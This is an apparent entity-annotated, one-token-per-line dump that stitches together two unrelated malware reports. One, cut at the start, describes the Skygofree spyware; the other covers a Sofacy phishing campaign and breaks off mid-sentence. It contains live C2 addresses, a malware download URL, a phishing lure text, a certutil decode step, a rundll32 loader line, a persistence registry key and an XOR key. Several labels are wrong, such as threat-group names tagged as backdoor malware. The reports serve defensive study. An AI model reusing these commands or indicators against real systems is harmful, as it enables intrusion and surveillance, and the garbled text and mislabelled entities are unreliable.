payload
is
determined
by
the
implant
's
version
,
and
it
can
be
downloaded
from
the
command
and
control
(
C&C
)
server
soon
after
the
implant
starts
,
or
after
a
specific
command
.

In
the
most
recent
case
,
the
choice
of
the
payload
zip
file
depends
on
the
device
process
architecture
.

For
now
,
we
observe
only
one
payload
version
for
following
the
ARM
CPUs
:
arm64-v8a
,
armeabi
,
armeabi-v7a
.

Note
that
in
almost
all
cases
,
this
payload
file
,
contained
in
zip
archives
,
is
named
'
setting
'
or
'
setting.o
'
.

The
main
purpose
of
this
module
is
providing
reverse
shell
features
on
the
device
by
connecting
with
the
C&C
server
's
socket
.

Reverse
shell
payload
The
payload
is
started
by
the
main
module
with
a
specified
host
and
port
as
a
parameter
that
is
hardcoded
to
'
54.67.109.199
'
and
'30010
'
in
some
versions
:
Alternatively
,
they
could
be
hardcoded
directly
into
the
payload
code
:
We
also
observed
variants
that
were
equipped
with
similar
reverse
shell
payloads
directly
in
the
main
APK
/lib/
path
.

Equipped
reverse
shell
payload
with
specific
string
After
an
in-depth
look
,
we
found
that
some
versions
of
the
reverse
shell
payload
code
share
similarities
with
PRISM
–
a
stealth
reverse
shell
backdoor
that
is
available
on
Github
.

Reverse
shell
payload
from
update_dev.zip

Exploit
payload

At
the
same
time
,
we
found
an
important
payload
binary
that
is
trying
to
exploit
several
known
vulnerabilities
and
escalate
privileges
.

According
to
several
timestamps
,
this
payload
is
used
by
implant
versions
created
since
2016
.

It
can
also
be
downloaded
by
a
specific
command
.

The
exploit
payload
contains
following
file
components
:
Component
name
Description
run_root_shell/arrs_put_user.o/arrs_put_user/poc
Exploit
ELF
db
device.db
Sqlite3
tool
ELF
Sqlite3
database
with
supported
devices
and
their
constants
needed
for
privilege
escalation
'device.db
'
is
a
database
used
by
the
exploit
.

It
contains
two
tables
–
'supported_devices
'
and
'device_address
'
.

The
first
table
contains
205
devices
with
some
Linux
properties
;
the
second
contains
the
specific
memory
addresses
associated
with
them
that
are
needed
for
successful
exploitation
.

You
can
find
a
full
list
of
targeted
models
in
the
Appendix
.

Fragment
of
the
database
with
targeted
devices
and
specific
memory
addresses
If
the
infected
device
is
not
listed
in
this
database
,
the
exploit
tries
to
discover
these
addresses
programmatically
.

After
downloading
and
unpacking
,
the
main
module
executes
the
exploit
binary
file
.

Once
executed
,
the
module
attempts
to
get
root
privileges
on
the
device
by
exploiting
the
following
vulnerabilities
:
CVE-2013-2094
CVE-2013-2595
CVE-2013-6282
CVE-2014-3153
(
futex
aka
TowelRoot
)
CVE-2015-3636
Exploitation
process
After
an
in-depth
look
,
we
found
that
the
exploit
payload
code
shares
several
similarities
with
the
public
project
android-rooting-tools
.

Decompiled
exploit
function
code
fragment
run_with_mmap
function
from
the
android-rooting-tools
project
As
can
be
seen
from
the
comparison
,
there
are
similar
strings
and
also
a
unique
comment
in
Italian
,
so
it
looks
like
the
attackers
created
this
exploit
payload
based
on
android-rooting-tools
project
source
code
.

Busybox
payload

Busybox
is
public
software
that
provides
several
Linux
tools
in
a
single
ELF
file
.

In
earlier
versions
,
it
operated
with
shell
commands
like
this
:
Stealing
WhatsApp
encryption
key
with
Busybox
Social
payload
Actually
,
this
is
not
a
standalone
payload
file
–
in
all
the
observed
versions
its
code
was
compiled
with
exploit
payload
in
one
file
(
'
poc_perm
'
,
'
arrs_put_user
'
,
'
arrs_put_user.o
'
)
.

This
is
due
to
the
fact
that
the
implant
needs
to
escalate
privileges
before
performing
social
payload
actions
.

This
payload
is
also
used
by
the
earlier
versions
of
the
implant
.

It
has
similar
functionality
to
the
'
AndroidMDMSupport
'
command
from
the
current
versions
–
stealing
data
belonging
to
other
installed
applications
.

The
payload
will
execute
shell
code
to
steal
data
from
various
applications
.

The
example
below
steals
Facebook
data
:
All
the
other
hardcoded
applications
targeted
by
the
payload
:
Package
name
Name
jp.naver.line.android
LINE
:
Free
Calls
&
Messages
com.facebook.orca
Facebook
messenger
com.facebook.katana
com.whatsapp
com.viber.voip
Facebook
WhatsApp
Viber
Parser
payload
Upon
receiving
a
specific
command
,
the
implant
can
download
a
special
payload
to
grab
sensitive
information
from
external
applications
.

The
case
where
we
observed
this
involved
WhatsApp
.

In
the
examined
version
,
it
was
downloaded
from
:
hxxp://url[.]plus/Updates/tt/parser.apk
The
payload
can
be
a
.dex
or
.apk
file
which
is
a
Java-compiled
Android
executable
.

After
downloading
,
it
will
be
loaded
by
the
main
module
via
DexClassLoader
api
:
As
mentioned
,
we
observed
a
payload
that
exclusively
targets
the
WhatsApp
messenger
and
it
does
so
in
an
original
way
.

The
payload
uses
the
Android
Accessibility
Service
to
get
information
directly
from
the
displayed
elements
on
the
screen
,
so
it
waits
for
the
targeted
application
to
be
launched
and
then
parses
all
nodes
to
find
text
messages
:
Note
that
the
implant
needs
special
permission
to
use
the
Accessibility
Service
API
,
but
there
is
a
command
that
performs
a
request
with
a
phishing
text
displayed
to
the
user
to
obtain
such
permission
.

Windows
We
have
found
multiple
components
that
form
an
entire
spyware
system
for
the
Windows
platform
.

Name
MD5
Purpose
Main
msconf.exe
55fb01048b6287eadcbd9a0f86d21adf B_hash
module
,
network.exe
f673bb1d519138ced7659484c0b66c5b B_hash
system.exe
d3baa45ed342fbc5a56d974d36d5f73f B_hash
reverse
shell
Sending
exfiltrated
data
Surrounding
sound
recording
by
mic
update.exe
395f9f87df728134b5e3c1ca4d48e9fa B_hash
Keylogging
wow.exe
16311b16fd48c1c87c6476a455093e7a B_hash
Screenshot
capturing
Skype
call
skype_sync2.exe
6bcc3559d7405f25ea403317353d905f B_hash
recording
to
MP3
All
modules
,
except
skype_sync2.exe
,
are
written
in
Python
and
packed
to
binary
files
via
the
Py2exe
tool
.

This
sort
of
conversion
allows
Python
code
to
be
run
in
a
Windows
environment
without
pre-installed
Python
binaries
.

msconf.exe
is
the
main
module
that
provides
control
of
the
implant
and
reverse
shell
feature
.

It
opens
a
socket
on
the
victim
's
machine
and
connects
with
a
server-side
component
of
the
implant
located
at
54.67.109.199:6500 B_ip.unknown
.

Before
connecting
with
the
socket
,
it
creates
a
malware
environment
in
'APPDATA/myupd
'
and
creates
a
sqlite3
database
there
–
'myupd_tmp\\mng.db
'
:
CREATE
TABLE
MANAGE
(
ID
INT
PRIMARY
KEY
NOT
NULL
,
Send
INT
NOT
NULL
,
Keylogg
INT
NOT
NULL
,
Screenshot
INT
NOT
NULL
,
Audio
INT
NOT
NULL
)
;
INSERT
INTO
MANAGE
(
ID
,
Send
,
Keylogg
,
Screenshot
,
Audio
)
VALUES
(
1
,
1
,
1
,
1
,
0
)
Finally
,
the
malware
modifies
the
'
Software\Microsoft\Windows\CurrentVersion\Run
'
registry
key
to
enable
autostart
of
the
main
module
.

The
code
contains
multiple
comments
in
Italian
,
here
is
the
most
noteworthy
example
:
'Receive
commands
from
the
remote
server
,
here
you
can
set
the
key
commands
to
command
the
virus
'
Here
are
the
available
commands
:
Name
cd
quit
nggexe
Description
Change
current
directory
to
specified
Close
the
socket
Execute
received
command
via
Python
's
subprocess.Popen
(
)
without
outputs
ngguploads
Upload
specified
file
to
the
specified
URL
Download
content
from
the
nggdownloads
specified
URLs
and
save
to
specified
file
nggfilesystem
Dump
file
structure
of
the
C
:
path
,
save
it
to
the
file
in
json
format
and
zip
it
nggstart_screen
nggstop_screen
Enable/disable
screenshot
module
.

When
enabled
,
it
makes
a
screenshot
every
25
seconds
nggstart_key
nggstop_key
nggstart_rec
nggstop_rec
ngg_status
*any
other*
Enable/disable
keylogging
module
Enable/disable
surrounding
sounds
recording
module
Send
components
status
to
the
C
&
C
socket
Execute
received
command
via
Python
's
subprocess.Popen
(
)
,
output
result
will
be
sent
to
the
C&C
socket
.

All
modules
set
hidden
attributes
to
their
files
:
Module
Paths
Exfiltrated
data
format
msconf.exe
%
APPDATA
%
/myupd/gen/
%
H%M%S_filesystem.zip
(
file
%
Y%m%d-system.exe
%
APPDATA
%
/myupd/aud/
structure
dump
)
%
d%m%Y%H%M%S.wav
(
surrounding
sounds
)
update.exe
%
APPDATA
%
/myupd_tmp/txt/
%
Y%m%d-%H%M%S.txt
%
APPDATA
%
/myupd/txt/
(
keylogging
)
wow.exe
%
APPDATA
%
/myupd/scr/
skype_sync2.exe
%
APPDATA
%
/myupd_tmp/skype/
%
APPDATA
%
/myupd/skype/
%
Y%m%d-%H%M%S.jpg
(
screenshots
)
yyyyMMddHHmmss_in.mp3
yyyyMMddHHmmss_out.mp3
(
skype
calls
records
)
Moreover
,
we
found
one
module
written
in
.Net
–
skype_sync2.exe
.

The
main
purpose
of
this
module
is
to
exfiltrate
Skype
call
recordings
.

Just
like
the
previous
modules
,
it
contains
multiple
strings
in
Italian
.

After
launch
,
it
downloads
a
codec
for
MP3
encoding
directly
from
the
C
&
C
server
:
http://54.67.109.199/skype_resource/libmp3lame.dll B_url.normal
The
skype_sync2.exe
module
has
a
compilation
timestamp
–
Feb
06
2017
and
the
following
PDB
string
:
\\vmware-host\Shared
Folders\dati\Backup\Projects\REcodin_2\REcodin_2\obj\x86\Release\REc
odin_2.pdb
network.exe
is
a
module
for
submitting
all
exfiltrated
data
to
the
server
.

In
the
observed
version
of
the
implant
it
does
n't
have
an
interface
to
work
with
the
skype_sync2.exe
module
.

network.exe
submitting
to
the
server
code
snippet
Code
similarities
We
found
some
code
similarities
between
the
implant
for
Windows
and
other
public
accessible
projects
.

https://github.com/El3ct71k/Keylogger/
It
appears
the
developers
have
copied
the
functional
part
of
the
keylogger
module
from
this
project
.

update.exe
module
and
Keylogger
by
'El3ct71k
'
code
comparison
Xenotix
Python
Keylogger
including
specified
mutex
'mutex_var_xboz
'
.

update.exe
module
and
Xenotix
Python
Keylogger
code
comparison
'addStartup
'
method
from
msconf.exe
module
'addStartup
'
method
from
Xenotix
Python
Keylogger
Distribution
We
found
several
landing
pages
that
spread
the
Android
implants
.

Malicious
URL
Referrer
Dates
http://217.194.13.133/tre/internet/Configuratore_3.a B_url.distribute
pk I
http://217.194.13.133/appP B_url.distribute
ro_AC.apk I
http://217.194.13.133/190/ B_url.distribute
configurazione/vodafone/ I
smartphone/VODAFONE I
% I
20Configuratore I
% I
20v5_4 I
_2.apk I
http://217.194.13.133/190/ B_url.distribute
configurazione/vodafone/ I
smartphone/Vodafone I
% I
20 I
Configuratore.apk I
http://vodafoneinfinity.syt B_url.distribute
es.net/tim/internet/Config I
uratore_TIM.apk I
http://vodafoneinfinity.syt B_url.distribute
es.net/190/configurazione I
/vodafone/smartphone/V I
ODAFONE I
% I
20Configurato I
re%20v5_4_2.apk I
http://windupdate.serveft B_url.distribute
p.com/wind/LTE/WIND%2 I
http://217.194.13.133/tre/i B_url.distribute
nternet/ I
2015-02-04
to
present
time
–
2015-07-01
http://217.194.13.133/190/ B_url.distribute
configurazione/vodafone/ I
smartphone/index.html I
2015-01-20
to
present
time
http://217.194.13.133/190/ B_url.distribute
configurazione/vodafone/ I
smartphone/index.html I
currently
active
http://vodafoneinfinity.syt B_url.distribute
es.net/tim/internet/ I
2015-03-04
http://vodafoneinfinity.syt B_url.distribute
es.net/190/configurazione I
/vodafone/smartphone/ I
2015-01-14
http://windupdate.serveft B_url.distribute
p.com/wind/LTE/ I
0Configuratore I
% I
20v5_4_ I
2.apk I
http://119.network/lte/Inte B_url.distribute
rnet-TIM-4G-LTE.apk I
http://119.network/lte/do B_url.distribute
http://119.network/lte/Co B_url.distribute
nfiguratore_TIM.apk I
wnload.html I
2015-02-04
2015-07-20
2015-07-08
Many
of
these
domains
are
outdated
,
but
almost
all
(
except
one
–
appPro_AC.apk
)
samples
located
on
the
217.194.13.133 B_ip.distribute
server
are
still
accessible
.

All
the
observed
landing
pages
mimic
the
mobile
operators
'
web
pages
through
their
domain
name
and
web
page
content
as
well
.

Landing
web
pages
that
mimic
the
Vodafone
and
Three
mobile
operator
sites
NETWORK
CONFIGURATION
**
AGG
.

2.3.2015
***
Dear
Customer
,
in
order
to
avoid
malfunctions
to
your
internet
connection
,
we
encourage
you
to
upgrade
your
configuration
.

Download
the
update
now
and
keep
on
navigating
at
maximum
speed
!

DOWNLOAD
NOW
Do
you
doubt
how
to
configure
your
smartphone
?

Follow
the
simple
steps
below
and
enter
the
Vodafone
Fast
Network
.

Installation
Guide
Download
Click
on
the
DOWNLOAD
button
you
will
find
on
this
page
and
download
the
application
on
your
smartphone
.

Set
your
Smartphone
Go
to
Settings-
>
Security
for
your
device
and
put
a
check
mark
on
Unknown
Sources
(
some
models
are
called
Sources
Unknown
)
.

Install
Go
to
notifications
on
your
device
(
or
directly
in
the
Downloads
folder
)
and
click
Vodafone
Configuration
Update
to
install
.

Try
high
speed
Restart
your
device
and
wait
for
confirmation
sms
.

Your
smartphone
is
now
configured
.

Further
research
of
the
attacker
's
infrastructure
revealed
more
related
mimicking
domains
.

Unfortunately
,
for
now
we
ca
n't
say
in
what
environment
these
landing
pages
were
used
in
the
wild
,
but
according
to
all
the
information
at
our
dsiposal
,
we
can
assume
that
they
are
perfect
for
exploitation
using
malicious
redirects
or
man-in-the-middle
attacks
.

For
example
,
this
could
be
when
the
victim
's
device
connects
to
a
Wi-Fi
access
point
that
is
infected
or
controlled
by
the
attackers
.

Artifacts
During
the
research
,
we
found
plenty
of
traces
of
the
developers
and
those
doing
the
maintaining
.

As
already
stated
in
the
'malware
features
'
part
,
there
are
multiple
giveaways
in
the
code
.

Here
are
just
some
of
them
:
ngglobal
–
FirebaseCloudMessaging
topic
name
Issuer
:
CN
=
negg
–
from
several
certificates
negg.ddns[.]net
,
negg1.ddns[.]net
,
negg2.ddns[.]net
–
C
&
C
servers
NG
SuperShell
–
string
from
the
reverse
shell
payload
ngg
–
prefix
in
commands
names
of
the
implant
for
Windows
Signature
with
specific
issuer
Whois
records
and
IP
relationships
provide
many
interesting
insights
as
well
.

There
are
a
lot
of
other
'Negg
'
mentions
in
Whois
records
and
references
to
it
.

For
example
:
Conclusions
The
Skygofree B_malware.backdoor
Android
implant
is
one
of
the
most
powerful
spyware
tools
that
we
have
ever
seen
for
this
platform
.

As
a
result
of
the
long-term
development
process
,
there
are
multiple
,
exceptional
capabilities
:
usage
of
multiple
exploits
for
gaining
root
privileges
,
a
complex
payload
structure
,
never-before-seen
surveillance
features
such
as
recording
surrounding
audio
in
specified
locations
.

Given
the
many
artifacts
we
discovered
in
the
malware
code
,
as
well
as
infrastructure
analysis
,
we
are
pretty
confident
that
the
developer
of
the
Skygofree B_malware.backdoor
implants
is
an
Italian
IT
company
that
works
on
surveillance
solutions
,
just
like
HackingTeam
.

Notes
*
Skygofree B_malware.backdoor
has
no
connection
to
Sky
,
Sky
Go
or
any
other
subsidiary
of
Sky
,
and
does
not
affect
the
Sky
Go
service
or
app
.

Skygofree B_malware.backdoor
Appendix
—
Indicators
of
Compromise
(
PDF
)
GOOGLE
ANDROID
HACKING
TEAM
Share
post
on
:
MOBILE
MALWARE
Related
Posts



Jack
of
all
trades
Still
Stealing
Kaspersky
Security
Bulletin
:
Review
of
the
Year
2017
Blog
Home
(
https://researchcenter.paloaltonetworks.com/ B_url.normal
)
>
Unit
42
(
https://researchcenter.paloaltonetworks.com/unit42/ B_url.normal
)
>
Sofacy
Attacks
Multiple
Government
Entities
Sofacy
Attacks
Multiple
Government
Entities
By
Bryan
Lee
(
https://researchcenter.paloaltonetworks.com/author/bryan-lee/ B_url.normal
)
,
Mike
Harbison
(
https://researchcenter.paloaltonetworks.com/author/mike-harbison/ B_url.normal
)
and
Robert
Falcone
(
https://researchcenter.paloaltonetworks.com/author/robert-falcone/ B_url.normal
)
February
28
,
2018
at
10:00
AM
Category
:
Unit
42
(
https://researchcenter.paloaltonetworks.com/unit42/ B_url.normal
)
Tags
:
APT28
(
https://researchcenter.paloaltonetworks.com/tag/apt28/ B_url.normal
)
,
Carberp
(
https://researchcenter.paloaltonetworks.com/tag/carberp/ B_url.normal
)
,
LuckyStrike B_malware.drop
(
https://researchcenter.paloaltonetworks.com/tag/luckystrike/ B_url.normal
)
,
Ministry
of
Foreign
Affairs
(
https://researchcenter.paloaltonetworks.com/tag/ministry-of-foreign-affairs/ B_url.normal
)
,
Powershell
(
https://researchcenter.paloaltonetworks.com/tag/powershell/ B_url.normal
)
,
Sofacy
(
https://researchcenter.paloaltonetworks.com/tag/sofacy/ B_url.normal
)
,
Trojan
(
https://researchcenter.paloaltonetworks.com/tag/trojan/ B_url.normal
)

4,114

(
4
)
(
https://twitter.com/home B_url.normal
? I
status=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F02%2Funit42-sofacy-attacks-multiple-government-entities I
% I
2F+Sofacy+Attacks+Multiple+Government+Entities I
)

(
https://www.facebook.com/sharer/sharer.php  B_url.normal
? I
u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F02%2Funit42-sofacy-attacks-multiple-government-entities I
% I
2F I
)

(
https://www.linkedin.com/shareArticle B_url.normal
? I
mini=true I
& I
url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F02%2Funit42-sofacy-attacks-multiple-government-entities I
% I
2F I
& I
title=Sofacy+Attacks+Multiple+Government+Entities I
& I
summary= I
& I
source= I
)
(
//
www.reddit.com/submit B_url.normal
)

The
Sofacy
group
(
AKA
APT28
,
Fancy B_malware.backdoor
Bear I
,
STRONTIUM B_malware.backdoor
,
Sednit B_malware.backdoor
,
Tsar B_malware.backdoor
Team I
,
Pawn B_malware.backdoor
Storm I
)
is
a
wellknown
adversary
that
remains
highly
active
in
the
new
calendar
year
of
2018
.

Unit
42
actively
monitors
this
group
due
to
their
persistent
nature
globally
across
all
industry
verticals
.

Recently
,
we
discovered
a
campaign
launched
at
various
Ministries
of
Foreign
Affairs
around
the
world
.

Interestingly
,
there
appear
to
be
two
parallel
efforts
within
the
campaign
,
with
each
effort
using
a
completely
different
toolset
for
the
attacks
.

In
this
blog
,
we
will
discuss
one
of
the
efforts
which
leveraged
tools
that
have
been
known
to
be
associated
with
the
Sofacy
group
.

Attack
Details

At
the
beginning
of
February
2018
,
we
discovered
an
attack
targeting
two
government
institutions
related
to
foreign
affairs
.

These
entities
are
not
regionally
congruent
,
and
the
only
shared
victimology
involves
their
organizational
functions
.

Specifically
,
one
organization
is
geographically
located
in
Europe
and
the
other
in
North
America
.

The
initial
attack
vector
leveraged
a
phishing
email
(
seen
in
Figure
1
)
,
using
the
subject
line
of
Upcoming
Defense
events
February
2018
and
a
sender
address
claiming
to
be
from
Jane
's
360
defense
events
<
events@ihsmarkit.com B_url.normal
>
.

Jane
's
(
http://www.janes.com/ B_url.normal
)
by
IHSMarkit
is
a
wellknown
supplier
of
information
and
analysis
often
times
associated
with
the
defense
and
government
sector
.

Analysis
of
the
email
header
data
showed
that
the
sender
address
was
spoofed
and
did
not
originate
from
IHSMarkit
at
all
.

The
lure
text
in
the
phishing
email
claims
the
attachment
is
a
calendar
of
events
relevant
to
the
targeted
organizations
and
contained
specific
instructions
regarding
the
actions
the
victim
would
have
to
take
if
they
had
'
trouble
viewing
the
document
'
.

Figure
1
Spear-phishing
email
used
in
the
attack
campaign
The
attachment
itself
is
an
Microsoft
Excel
XLS
document
that
contains
malicious
macro
script
.

The
document
presents
itself
as
a
standard
macro
document
but
has
all
of
its
text
hidden
until
the
victim
enables
macros
.

Notably
,
all
of
the
content
text
is
accessible
to
the
victim
even
before
macros
are
enabled
.

However
,
a
white
font
color
is
applied
to
the
text
to
make
it
appear
that
the
victim
must
enable
macros
to
access
the
content
.

Once
the
macro
is
enabled
,
the
content
is
presented
via
the
following
code
:
ActiveSheet.Range('a1:c54').Font.Color
=
vbBlack
The
code
above
changes
the
font
color
to
black
within
the
specified
cell
range
and
presents
the
content
to
the
user
.

On
initial
inspection
,
the
content
appears
to
be
the
expected
legitimate
content
,
however
,
closer
examination
of
the
document
shows
several
abnormal
artifacts
that
would
not
exist
in
a
legitimate
document
.

Figure
2
below
shows
how
the
delivery
document
initially
looks
and
the
transformation
the
content
undergoes
as
the
macro
runs
.

Figure
2
Delivery
document
before
and
after
the
macro
is
run
Delivery
Document

As
mentioned
in
a
recent
ISC
diary
entry
(
https://isc.sans.edu/forums/diary/Simple+but+Effective+Malicious+XLS+Sheet/23305/ B_url.normal
)
,
the
macro
gets
the
contents
of
cells
in
column
170
in
rows
2227
to
2248
to
obtain
the
base64
encoded
payload
,
which
can
be
seen
in
the
following
screenshot
:
Figure
3
Delivery
Document
showing
base64
encoded
payload
The
macro
prepends
the
string
—–BEGIN
CERTIFICATE—–
to
the
beginning
of
the
base64
encoded
payload
and
appends
—–END
CERTIFICATE—–
to
the
end
of
the
data
.

The
macro
then
writes
this
data
to
a
text
file
in
the
C
:
\Programdata
folder
using
a
random
filename
with
the
.txt
extension
.

The
macro
then
uses
the
command
certutil
­decode
to
decode
the
contents
of
this
text
file
and
outputs
the
decoded
content
to
a
randomly
named
file
with
a
.exe
extension
in
the
C
:
\Programdata
folder
.

The
macro
sleeps
for
two
seconds
and
then
executes
the
newly
dropped
executable
.

The
newly
dropped
executable
is
a
loader
Trojan
responsible
for
installing
and
running
the
payload
of
this
attack
.

We
performed
a
more
detailed
analysis
on
this
loader
Trojan
,
which
readers
can
view
in
this
report
's
appendix
.

Upon
execution
,
the
loader
will
decrypt
the
embedded
payload
(
DLL
)
using
a
custom
algorithm
,
decompress
it
and
save
it
to
the
following
file
:
%
LOCALAPPDATA%\cdnver.dll
The
loader
will
then
create
the
batch
file
%
LOCALAPPDATA%\cdnver.bat
,
which
it
will
write
the
following
:
start
rundll32.exe
'C
:
\Users\user\AppData\Local\cdnver.dll',#1
The
loader
Trojan
uses
this
batch
file
to
run
the
embedded
DLL
payload
.

For
persistence
,
the
loader
will
write
the
path
to
this
batch
file
to
the
following
registry
key
,
which
will
run
the
batch
file
each
time
the
user
logs
into
the
system
:
HKCU\Environment\UserInitMprLogonScript
The
cdnver.dll
payload
installed
by
the
loader
executable
is
a
variant
of
the
SofacyCarberp
(
https://researchcenter.paloaltonetworks.com/tag/carberp/ B_url.normal
)
payload
,
which
is
used
extensively
by
the
Sofacy
threat
group
.

Overall
,
SofacyCarberp
does
initial
reconnaissance
by
gathering
system
information
and
sending
it
to
the
C2
server
prior
to
downloading
additional
tools
to
the
system
.

This
variant
of
SofacyCarberp
was
configured
to
use
the
following
domain
as
its
C2
server
:
cdnverify[.]net
The
loader
and
the
SofacyCarberp
sample
delivered
in
this
attack
is
similar
to
samples
we
have
analyzed
in
the
past
but
contains
marked
differences
.

These
differences
include
a
new
hashing
algorithm
to
resolve
API
functions
and
to
find
running
browser
processes
for
injection
,
as
well
as
changes
to
the
C2
communication
mechanisms
as
explained
in
detail
within
the
appendix
.

Open-source
Delivery
Document
Generator
It
appears
that
Sofacy
may
have
used
an
open-source
tool
called
Luckystrike B_malware.drop
(
https://github.com/curi0usJack/luckystrike B_url.normal
)
to
generate
the
delivery
document
and/or
the
macro
used
in
this
attack
.

Luckystrike B_malware.drop
,
which
was
presented
at
DerbyCon
6
in
September
2016
(
https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator B_url.normal
)
,
is
a
Microsoft
PowerShell-based
tool
that
generates
malicious
delivery
documents
by
allowing
a
user
to
add
a
macro
to
an
Excel
or
Word
document
to
execute
an
embedded
payload
.

We
believe
Sofacy
used
this
tool
,
as
the
macro
within
their
delivery
document
closely
resembles
the
macros
found
within
Luckystrike B_malware.drop
.

To
confirm
our
suspicions
,
we
generated
a
malicious
Excel
file
with
Luckystrike B_malware.drop
and
compared
its
macro
to
the
macro
found
within
Sofacy
's
delivery
document
.

We
found
that
there
was
only
one
difference
between
the
macros
besides
the
random
function
name
and
random
cell
values
that
the
Luckystrike B_malware.drop
tool
generates
for
each
created
payload
.

The
one
non-random
string
difference
was
the
path
to
the
'.txt
'
and
'.exe
'
files
within
the
command
'
certutil
-decode
'
,
as
the
Sofacy
document
used
'C
:
⧵Programdata⧵
'
for
the
path
whereas
the
Luckystrike B_malware.drop
document
used
the
path
stored
in
the
Application.UserLibraryPath
environment
variable
.

Figure
3
below
shows
a
diff
with
the
LuckyStrike B_malware.drop
macro
on
the
left
and
Sofacy
macro
on
the
right
,
where
everything
except
the
file
path
and
randomly
generated
values
in
the
macro
are
exactly
the
same
,
including
the
obfuscation
attempts
that
use
concatenation
to
build
strings
.

(
https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/02/luckystrike_diff.png B_url.normal
)
Figure
4
Diff
of
macros
in
Luckystrike B_malware.drop
generated
document
(
left
)
and
Sofacy
's
delivery
document
(
right
)
Discovery
and
relationships
With
much
of
our
research
,
our
initial
direction
and
discovery
of
emerging
threats
is
generally
some
combination
of
previously
observed
behavioral
rulesets
or
relationships
.

In
this
case
,
we
had
observed
a
strange
pattern
emerging
from
the
Sofacy
group
over
the
past
year
within
their
command
and
control
infrastructure
.

Patterning
such
as
reuse
of
WHOIS
artifacts
,
IP
reuse
,
or
even
domain
name
themes
are
common
and
regularly
used
to
group
attacks
to
specific
campaigns
.

In
this
case
,
we
had
observed
the
Sofacy
group
registering
new
domains
,
then
placing
a
default
landing
page
which
they
then
used
repeatedly
over
the
course
of
the
year
.

No
other
parts
of
the
C2
infrastructure
amongst
these
domains
contained
any
overlapping
artifacts
.

Instead
,
the
actual
content
within
the
body
of
the
websites
was
an
exact
match
in
each
instance
.

Specifically
,
the
strings
866­593­54352
(
notice
it
is
one
digit
too
long
)
,
403­965­2341
,
or
the
address
522
Clematis
.

Suite
3000
was
repeatedly
found
in
each
instance
.

ThreatConnect
(
https://www.threatconnect.com/blog/track-to-the-future/ B_url.normal
)
had
made
the
same
observation
regarding
this
patterning
in
September
2017
.

Figure
5
Default
landing
page
for
cdnverify.net
domain
Figure
6
Default
landing
page
for
hotfixmsupload.com B_url.unknown
domain
Hotfixmsupload[.]com B_url.unknown
is
particularly
interesting
as
it
has
been
identified
as
a
Sofacy
C2
domain
repeatedly
,
and
was
also
brought
forth
by
Microsoft
in
a
legal
complaint
against
STRONTIUM
(
Sofacy
)
as
documented
here
(
https://noticeofpleadings.com/strontium/ B_url.normal
)
.

Leveraging
this
intelligence
allowed
us
to
begin
predicting
potential
C2
domains
that
would
eventually
be
used
by
the
Sofacy
group
.

In
this
scenario
,
the
domain
cdnverify[.]net
was
registered
on
January
30
,
2018
and
just
two
days
later
,
an
attack
was
launched
using
this
domain
as
a
C2
.

Conclusion
The
Sofacy
group
should
no
longer
be
an
unfamiliar
threat
at
this
stage
.

They
have
been
well
documented
and
well
researched
with
much
of
their
attack
methodologies
exposed
.

They
continue
to
be
persistent
in
their
attack
campaigns
and
continue
to
use
similar
tooling
as
in
the
past
.

This
leads
us
to
believe
that
their
attack
attempts
are
likely
still
succeeding
,
even
with
the
wealth
of
threat
intelligence
available
in
the
public
domain
.

Application
of
the
data
remains
challenging
,
and
so
to
continue
our
initiative
of
establishing
playbooks
for
adversary
groups
,
we
have
added
this
attack
campaign
as
the
next
playbook
(
https://pan-unit42.github.io/playbook_viewer/ B_url.normal
)
in
our
dataset
.

Palo
Alto
Networks
customers
are
protected
from
this
threat
by
:
1
.

WildFire
detects
all
SofacyCarberp
payloads
with
malicious
verdicts
.

2
.

AutoFocus
customers
can
track
these
tools
with
the
Sofacy
(
https://autofocus.paloaltonetworks.com/#/tag/Unit42.Sofacy B_url.normal
)
,
SofacyMacro
(
https://autofocus.paloaltonetworks.com/#/tag/Unit42.SofacyMacroDoc B_url.normal
)
and
SofacyCarberp
(
https://autofocus.paloaltonetworks.com/#/tag/Unit42.SofacyCarberp B_url.normal
)
3
.

Traps
blocks
the
Sofacy
delivery
documents
and
the
SofacyCarberp
payload
.

IOCs
SHA256
ff808d0a12676bfac88fd26f955154f8884f2bb7c534b9936510fd6296c543e8 B_hash
12e6642cf6413bdf5388bee663080fa299591b2ba023d069286f3be9647547c8 B_hash
cb85072e6ca66a29cb0b73659a0fe5ba2456d9ba0b52e3a4c89e86549bc6e2c7 B_hash
23411bb30042c9357ac4928dc6fca6955390361e660fec7ac238bbdcc8b83701 B_hash
Domains
Cdnverify[.]net B_url.unknown
Email
Subject
Upcoming
Defense
events
February
2018
Filename
Upcoming
Events
February
2018.xls
Appendix
Loader
Trojan
The
payload
dropped
to
the
system
by
the
macro
is
an
executable
that
is
responsible
for
installing
and
executing
a
dynamic
link
library
(
DLL
)
to
the
system
.

This
executable
contains
the
same
decryption
algorithm
as
the
loader
we
analyzed
in
the
DealersChoice
attacks
in
late
2016
(
https://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/ B_url.normal
)
.

The
loader
has
several
coding
features
that
make
it
interesting
.

For
example
,
upon
execution
,
the
loader
attempts
to
load
the
following
library
:
api­ms­win­core­synch­l1­2­0.dll
.

This
DLL
is
part
of
the
Universal
Windows
Platform
app
to
Windows
10
.

Typically
,
a
developer
would
not
link
directly
to
this
file
,
but
to
WindowsApp.lib
,
which
gives
access
to
the
underlying
APIs
.

It
appears
the
loader
included
definitions
of
wrappers
for
Windows
API
functions
that
can
not
be
called
directly
because
they
are
not
supported
on
all
operating
systems
.

Upon
execution
,
the
loader
will
decrypt
the
embedded
payload
(
DLL
)
using
a
custom
algorithm
followed
by
decompressing
it
using
the
RtlDecompressBuffer
API
.

This
API
is
normally
used
for
Windows
drivers
,
but
there
is
nothing
to
prevent
a
userland
process
from
using
it
,
and
the
parameters
are
documented
(
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtldecompressbuffer B_url.normal
)
on
MSDN
.

The
compression
algorithm
used
is
LZNT1
with
maximum
compression
level
.

The
payload
is
decrypted
using
a
starting
10-byte
XOR
key
of
:
0x3950BE2CD37B2C7CCBF8
.

Once
decrypted
,
the
data
is
then
passed
to
the
